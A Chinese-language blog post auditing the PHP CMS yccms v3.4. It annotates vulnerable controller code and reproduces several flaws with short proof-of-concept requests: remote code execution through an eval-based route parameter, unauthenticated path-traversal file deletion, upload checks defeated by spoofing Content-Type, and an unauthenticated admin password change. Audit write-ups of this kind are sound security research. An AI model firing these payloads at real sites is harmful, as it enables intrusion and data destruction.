---
title: yccms v3.4 代码审计
date: 2025-07-12 9:00:00
tags: [PHP 代码审计]            #标签
categories: [PHP]      #分类
description: yccms v3.4 代码审计       #简要说明
toc: true           #显示目录
---
# yccms v3.4 代码审计

程序版本：

![20250708090010810](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080948854.png)



从这个目录结构注意到这是一个MVC模式

![20250708135815537](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080948086.png)







## 通读代码

### admin

#### index.php

后台入口

require  引入文件  /config/run.inc.php 完成网站的初始化

路由：GET   /admin?a=

### ceshi1&ceshi2&compile

都是一些页面模板

### config

#### config.inc.php		

数据库、Smarty以及其他的系统配置

#### count.php

通过计算根目录，加载 run.inc.php文件

#### run.inc.php			

初始化文件、入口文件（进入后台会调用）

功能：

- 开启session，设置编码和时区

- 引入配置文件和模板：`config/config.inc.php`

  ​	`/public/smarty/Smarty.class.php`

- 自动加载类：`__autoload()方法用于自动加载类`

  ​				    Action的类加载controller

  ​					Model的类加载model

  ​					其他的类加载public/class/

- 单入口：`Factory::setAction()->run();`调用控制器的run()，

安全问题：入口文件的Factory给下面的RCE提供了入口点

配置文件会有漏洞吗？配置文件会不会泄露数据库信息？

### contrller

#### Action.class.php

所有控制器的父类

功能：

- 定义属性
- 构造函数
- 分页、静态分页功能
- 控制器运行入口

```php
<?php
//控制器基类
class Action {//声明Action类，属于所有控制器的父类
	protected $_tpl = null;//定义属性
	protected $_model = null;	
	protected function __construct() {//__construct() 构造函数，就是当对象被创建时，类中被自动调用的第一个函数，并且一个类中只能存在一个构造函数。但这里是protected，就不能在类的外部直接new这个类，只能在子类中通过继承使用。
		$this->_tpl = TPL::getInstance();//模板渲染
		$this->_model = Factory::setModel();//创建模型对象
		Tool::setRequest(); //表单转义和html过滤	可以防XSS、SQL
	}
	
	protected function page($_total,$_pagesize = PAGE_SIZE, $_model = null) {//定义了一个分页函数
		$this->_model = Validate::isNullString($_model) ? $this->_model : $_model;
		$_page = new Page($_total,$_pagesize);
		$this->_model->setLimit($_page->getLimit());
		$this->_tpl->assign('page',$_page->showpage());
		$this->_tpl->assign('num',($_page->getPage()-1)*$_pagesize);
	}
	//静态专用
	protected function page2($_total,$_pagesize = PAGE_SIZE, $_model = null,$_url2='',$_fx='') {//另一种分页
		$this->_model = $_model;
		$_page = new Page($_total,$_pagesize,$_url2,$_fx);
		$this->_model->setLimit($_page->getLimit());
		$this->_tpl->assign('page',$_page->listpage());
		$this->_tpl->assign('num',($_page->getPage()-1)*$_pagesize);
	}
	
	public function run() {//控制器运行入口
		$_m = isset($_GET['m']) ? $_GET['m'] : 'index';//url传参'?m=',默认为index
		method_exists($this, $_m) ? eval('$this->'.$_m.'();') : $this->index();//eval() 可以执行任意字符串形式的 PHP 代码，此处通过搜索发现 run()函数 出现在 config/run.inc.php 这个文件，存在rce
 	}
}
?>
```

#### AdminAction.class.php

管理员控制器

功能：

- 加载后台首页

- 更改密码：使用sha1加密不安全

- 系统信息显示：

  系统信息页：

  ![20250711132213642](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080949129.png)

- 退出时清理缓存：删除 compile 目录文件

路由：?a=admin&m=update -> 调用 update()

#### ArticleAction.class.php

文章控制器，

功能：显示文章列表

​			提供搜索功能

​			增删修改文章

​			nav、attr（文章的修饰属性）等功能

#### CallAction.class.php

功能： 验证码生成

​		后台文件上传

​		编辑器上传

#### HtmlAction.class.php

生成静态控制器

>**生成静态页面：**
>
>首先调用模型，取出数据库内容，之后通过模板引擎渲染页面，输出HTML页面，然后使用工具类`Tool::HtmlFile($filename, $content)`，把HTML内容保存到指定路径，就可以在前端页面查看了。
>
>**静态页面作用：**
>
>- 直接访问`.html`文件，不需要调动数据库查询；
>- 页面生成后不再执行动态代码，防止SQL注入；
>- 当然，这种把内容提前准备好的方式，对于提升性能、减少算力、节约服务器资源、服务器更稳定等等有一定的优势。

本网站后台修改文章内容后需要**静态生成**，之后方可在首页显示。

功能： 生成首页

​			生成文章

​			栏目列表

​			模板渲染

​			静态化输出

​			分步处理

![20250711154124943](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080949148.png)

#### LinkAction.class.php

链接控制器

功能：后台管理友情链接，修改链接、排序功能

#### LoginAction.class.php

登录控制器

功能：登录验证：sha1加密密码

​			验证码

​			记住密码

​			AJAX 验证

#### NavAction.class.php

分类控制器

功能：查看、排序、增删修改分类列表

#### PicAction.class.php

图片控制器

功能：

- 后台图片展示：读取根目录中的uploads文件夹，但是没有过滤文件非法后缀，此处可能上传 .php 文件

- 删除：没有检验图片路径，存在任意文件删除漏洞

  

- 这里并没有进行用户权限的判断，非管理员（未登录）用户也可访问到图片列表并删除

```php
<?php
//图片控制器
class PicAction extends Action{
	public function __construct(){
		parent::__construct();
	}
    //这里并没有进行用户权限的判断，非管理员（未登录）用户也可访问到图片列表并删除
	public function index(){
		$_dirPath=opendir(dirname(dirname(__FILE__)).'/uploads//');//打开 /uploads/ 目录
		$_dirName='';//保存图片名
		$_picArr=array();
		while(!!$_dirName=readdir($_dirPath)){//遍历 uploads 下的文件，此处无过滤
			if($_dirName!='.' && $_dirName!='..'){
				$_picArr[] = $_dirName;
			}
		}
		krsort($_picArr);//逆序排列
		$this->_tpl->assign('picNum',count(scandir(dirname(dirname(__FILE__)).'/uploads//'))-2);//获取上传的文件数
		$this->_tpl->assign('picArr',$_picArr);//显示上传文件
		$this->_tpl->display('admin/public/picshow.tpl');
	}
	public function delall(){//删除图片，依旧没有验证用户
		if(isset($_POST['send'])){
			if(validate::isNullString($_POST['pid']))
                tool::layer_alert('没有选择任何图片!','?a=pic',7);//是否选择图片，若为空，layer_alert 弹窗提示7并跳回 '?a=pic'
			$_fileDir=ROOT_PATH.'/uploads/';//上传目录的跟路径
			foreach($_POST['pid'] as $_value){//遍历提交的图片名
				$_filePath=$_fileDir.$_value;//构造文件路径，这里的路径可以拼接，且 $_value 是可控的，造成漏洞
				if(!unlink($_filePath)){//unlink() 删除文件
					tool::layer_alert('图片删除失败,请设权限为777!','?a=pic',7);
				}else{
					header('Location:?a=pic');
				}
			}			
		}	
	}
}
?>
```

#### SearchAction.class.php

搜索控制器

功能：用于前端页面的内容搜索

#### SystemAction.class.php

系统设置控制器

功能：后台系统信息、设置首页文字内容



## 记一些知识点、函数

[PHP 中 private、public、protected区别](https://www.cnblogs.com/phpper/p/8976304.html)

[PHP 之 Smarty 模板引擎使用汇总](https://jueee.github.io/2020/10/2020-10-20-PHP%E4%B9%8BSmarty%E6%A8%A1%E6%9D%BF%E5%BC%95%E6%93%8E%E4%BD%BF%E7%94%A8%E6%B1%87%E6%80%BB/)

Smarty 是 PHP 的一个引擎模板，可以将 MVC 中的 C 分离出来。

[JavaScript之Ajax](https://blog.csdn.net/weixin_50602266/article/details/121910781)

>AJAX (Asynchronous JavaScript and XML) 异步 JS 和 XML，在不刷新整个页面的情况下，与服务器交换数据的技术。

### htmlspecialchars()

> `htmlspecialchars()` 函数把预定义的字符转换为 HTML 实体。
>
> 预定义的字符是：
>
> - & （和号）成为 &
> - " （双引号）成为 "
> - ' （单引号）成为 '
> - < （小于）成为 <
> - \> （大于）成为 >



## 历史漏洞

[YCCMS存在文件上传漏洞（CNVD-2021-47137）](https://www.cnvd.org.cn/flaw/show/CNVD-2021-47137)

[YCCMS存在文件上传漏洞（CNVD-2021-46794）](https://www.cnvd.org.cn/flaw/show/CNVD-2021-46794)

[YCCMS存在逻辑缺陷漏洞](https://www.cnvd.org.cn/flaw/show/CNVD-2021-46795)

### RCE漏洞复现

根据Action.class.php审计，发现`method_exists($this, $_m) ? eval('$this->'.$_m.'();') : $this->index();`

eval() 可以执行任意字符串形式的 PHP 代码，此处通过搜索发现 run()函数 出现在 config/run.inc.php 这个文件，存在rce

```PHP
//	config/run.inc.php  
Factory::setAction()->run();

->setAction()

//	public/class/Factory.class.php
class Factory{
    ...
static public function setAction(){
		$_a=self::getA();//$_a 是get传参，可控变量
		if (in_array($_a, array('admin', 'nav', 'article','backup','html','link','pic','search','system','xml','online'))) {
			if (!isset($_SESSION['admin'])) {
				header('Location:'.'?a=login');
			}  
		}
		if (!file_exists(ROOT_PATH.'/controller/'.ucfirst($_a).'Action.class.php')) $_a = 'Login';//ucfirst(), 将字符串首字母转化为大写，file_exists() 函数检查文件是否存在，如果文件不存在就回退为 Login 控制器
		eval('self::$_obj = new '.ucfirst($_a).'Action();');
		return self::$_obj;
	}
    ...
}
	
```



1、绕过 file_exists（）

这个函数在进行检查时，比如/controller/admin;/../，函数允许路径中有一些特殊字符，并且遇到/../会返回到上级目录，可以利用这个绕过 file_exists（）函数检查。

那么我们构造poc:`Factory();phpinfo();//../`

2、入口点

调用Factory() 的入口点在 Factory::setAction()->run(); 这里，在admin/index.php 这个文件中得知，它包含了/config/run.inc.php，可以利用

3、POC

`/admin?a=Factory();phpinfo();//../`

![20250710234248614](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080950740.png)



### 任意文件删除

根据审计PicAction.class.php时遇到的delall()函数，无验证造成的任意文件删除漏洞，进行复现。

```php
public function delall(){//删除图片，依旧没有验证用户
		if(isset($_POST['send'])){
			if(validate::isNullString($_POST['pid']))
                tool::layer_alert('没有选择任何图片!','?a=pic',7);//是否选择图片，若为空，layer_alert 弹窗提示7并跳回 '?a=pic'
			$_fileDir=ROOT_PATH.'/uploads/';//上传目录的跟路径
			foreach($_POST['pid'] as $_value){//遍历提交的图片名
				$_filePath=$_fileDir.$_value;//构造文件路径，这里的路径可以拼接，且 $_value 是可控的，造成漏洞
				if(!unlink($_filePath)){//unlink() 删除文件
					tool::layer_alert('图片删除失败,请设权限为777!','?a=pic',7);
				}else{
					header('Location:?a=pic');
				}
			}
					
		}
		
	}
```



来到对应的功能点：

![20250712193547260](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080950634.png)



先给 upload 随便上传一张图片

![20250712193717272](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080950799.png)

![20250712193754284](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080950970.png)



删除，进行抓包：

![20250712193827895](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080950144.png)

![20250712193843074](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080951787.png)



URL编码：`pid%5B0%5D=1.png&chkall=on&send=%E5%88%A0%E9%99%A4%E9%80%89%E4%B8%AD%E5%9B%BE%E7%89%87`

解码：

`pid[0]=1.png&chkall=on&send=删除选中图片`

`chkall=on`是一个复选框

![20250712194432977](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080951051.png)



可以看到只要在pid后的文件名进行路径拼接就可以跳到任意目录去删除文件



接下来就可以根据上面的数据构造POC：

`pid[0]=/../1.txt&chkall=on&send=删除选中图片`

`pid%5B0%5D=/../1.txt&chkall=on&send=%E5%88%A0%E9%99%A4%E9%80%89%E4%B8%AD%E5%9B%BE%E7%89%87`

路由：admin/?a=pic&m=delall



在根目录准备一个1.txt

![20250712194601104](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080951601.png)



退出登录

![20250712194749344](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080951683.png)



POST传参：

![20250712195154540](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080951643.png)

上图的浏览器删不掉，换了一个成功了



![20250712195540507](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080951397.png)



![20250712195612613](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080952634.png)



### 任意文章/文件（no）删除



这里想到审计ArticleAction.class.php时也有delall()函数，看看这里有没有文章删除漏洞。

```php
//删除单个文章
	public function delete(){
		if(isset($_GET['id'])){
			$this->_model->id=$_GET['id'];
			$_findOne=$this->_model->findOne();
			$html=$_findOne[0]->html;
			if($html==NULL){
				$html='0.html';
			}
			//先删除静态文件
			if(tool::delete_file($html)){
				if($this->_model->delete_article()){
					Tool::alertLocation(null, tool::getPrevPage());
				}else{
					tool::layer_alert('删除失败!','?a=article&m=index',7);
				}
			}
		}
	}
//删除多个文章
	public function delall(){
		if(isset($_POST['send'])){
			if(validate::isNullString($_POST['showid'])) tool::layer_alert('没有选择任何内容!','?a=article&m=index',7);
			//$this->_model->id=implode(',',$_POST['showid']);
			//echo $this->_model->id;
			foreach ($_POST['showid'] as $_value){
				$this->_model->id=$_value;
				$_findOne=$this->_model->findOne();
				$html=$_findOne[0]->html;
				if($html==NULL){
					$html='0.html';		
				}
				//先删除静态文件
				if(file_exists(ROOT_PATH.'/'.$html)){
				if(!unlink(ROOT_PATH.'/'.$html)){
					tool::layer_alert('静态文件删除失败,请设权限为777!','?a=article&m=index',5);
				}
				}
				$this->_model->delete_article();
				header('Location:'.tool::getPrevPage());
			}
		}
	}
```



#### delete()

GET传参，

找到一篇文章的id

![20250712200511140](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080952850.png)





构造POC：`admin/?a=article&m=delete&id=2450`



![20250712200604332](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080952517.png)

执行后发现这篇文章被删除了

![20250712200619491](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080952547.png)







#### delall()



功能点：此处多选删除

![20250712201015073](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080952341.png)



抓包：

![20250712201031989](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080952688.png)



`showid%5B%5D=2449&showid%5B%5D=2448&showid%5B%5D=2447&showid%5B%5D=2446&chkall=on&send=%E6%89%B9%E9%87%8F%E5%88%A0%E9%99%A4`

同样的，构造POC：

`showid%5B%5D=%2F..%2F1.txt&showid%5B%5D=2448&showid%5B%5D=2447&showid%5B%5D=2446&chkall=on&send=%E6%89%B9%E9%87%8F%E5%88%A0%E9%99%A4`

路由：admin/?a=article&m=delall

![20250712201614722](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080953834.png)

但是只删除了文章并没有删除1.txt ？？

再认真分析一遍：

```php
foreach ($_POST['showid'] as $_value){
				$this->_model->id=$_value;//获取文章id
				$_findOne=$this->_model->findOne();//数据库查询
				$html=$_findOne[0]->html;//从数据库中获取 HTML
```

直接传递`/../1.txt`作为ID值，系统会将`/../1.txt`当作文章ID去数据库查询，显然这个ID不存在

想要利用这里的漏洞，只能去更改数据库中HTML的内容，

添加、修改、删除都进行了用户验证，所以这个也不算一个漏洞了。

```php
$this->_tpl->assign('admin', $_SESSION['admin']);
$html=$_SESSION['html_temp'];
$_SESSION['html_temp']=$_art[0]->html;
```



### 任意文件上传

controller/CallAction.class.php

```PHP
//处理上传图片
	public function upLoad() {
		if (isset($_POST['send'])) {
			$_logoupload = new LogoUpload('pic',$_POST['MAX_FILE_SIZE']);
			$_path = $_logoupload->getPath();
			$_img = new Image($_path);
			$_img->xhImg(960,0);
			$_img->out();
			//echo $_path;
			$_logoupload->alertOpenerClose('图片上传成功！','..'.$_path);
		} else {
			exit('警告：文件过大或者其他未知错误导致浏览器崩溃！');
		}
	}
```

```php
//构造方法，初始化
	public function __construct($_file,$_maxsize) {
		$this->error = $_FILES[$_file]['error'];
		$this->maxsize = $_maxsize / 1024;
		$this->type = $_FILES[$_file]['type'];
		$this->path = ROOT_PATH.'/'.UPLOGO;
		$this->name = $_FILES[$_file]['name'];
		$this->tmp = $_FILES[$_file]['tmp_name'];
		$this->checkError();
		$this->checkType();
		$this->checkPath();
		$this->moveUpload();
	}
	
```

根据Content-Type的值来判断是否是图片格式，只要Content-Type是这两种类型就可以，那直接伪造Content-Type就可以了

### 任意文件上传-2

controller/CallAction.class.php

```php
//xheditor编辑器专用上传
	public function xhUp() {
		if (isset($_GET['type'])) {
			$_fileupload = new FileUpload('filedata',10);
			$_err=$_fileupload->checkError();
			$_path = $_fileupload->getPath();
			$_msg="'..$_path'";
			$_img = new Image($_path);
			$_img->xhImg(650,0);
			$_img->out();
			echo "{'err':'".$_err."','msg':".$_msg."}";
			exit();
		} else {
		Tool::alertBack('警告：由于非法操作导致上传失败！');
		}
	}


```

代码中的文件名以时间+100到1000之间的随机数进行重命名

同样也是检查的传入的Content-Type的值

### **未授权更改管理员账号密码**

首先来看一下漏洞利用过程，在未登录的情况下构造url,只需要更改username password notpassword的值即可更改数据库中admin账号的相关信息

根据url来定位一下漏洞函数，函数位于controller\AdminAction.class.php中的update函数

```php
public function update(){
        if(isset($_POST['send'])){
            if(validate::isNullString($_POST['username'])) Tool::t_back('用户名不能为空','?a=admin&m=update');
            if(validate::isNullString($_POST['password'])) Tool::t_back('密码不能为空!','?a=admin&m=update');
            if(!(validate::checkStrEquals($_POST['password'], $_POST['notpassword']))) Tool::t_back('两次密码不一致!','?a=admin&m=update');
            $this->_model->username=$_POST['username'];
            $this->_model->password=sha1($_POST['password']);
            $_edit=$this->_model->editAdmin();
            if($_edit){
                tool::layer_alert('密码修改成功!','?a=admin&m=update',6);
                }else{
                tool::layer_alert('密码未修改!','?a=admin&m=update',6);
            }
        }

            $this->_tpl->assign('admin', $_SESSION['admin']);
            $this->_tpl->display('admin/public/update.tpl');
    }
```

可以看到前面都是一些判断，重点关注下editAdmin()函数，该函数位于model\AdminModel.class.php

```php
public function editAdmin(){
        $_sql="UPDATE
                    my_admin
                SET
                    username='$this->username',
                    password='$this->password'
                WHERE
                    id=1
                LIMIT 1";
        return parent::update($_sql);
    }
```

该函数的父类为Model, 位于model\Model.class.php，看一下update函数

```php
protected function update($_sql){
        return $this->execute($_sql)->rowCount();
    }
```

调用execute函数去执行sql语句

```php
protected function execute($_sql){
        try{
            $_stmt=$this->_db->prepare($_sql);
            $_stmt->execute();
        }catch (PDOException $e){
            exit('SQL语句:'.$_sql.'<br />错误信息:'.$e->getMessage());
        }
        return $_stmt;
    }
}
```

这一系列的操作主要是用来生成SQL语句然后执行SQL语句，editAdmin函数直接把传进来的username password拼接到sql语句中，然后去更新相关表中id=1的数据，这也就造成了任意更改管理员账号密码











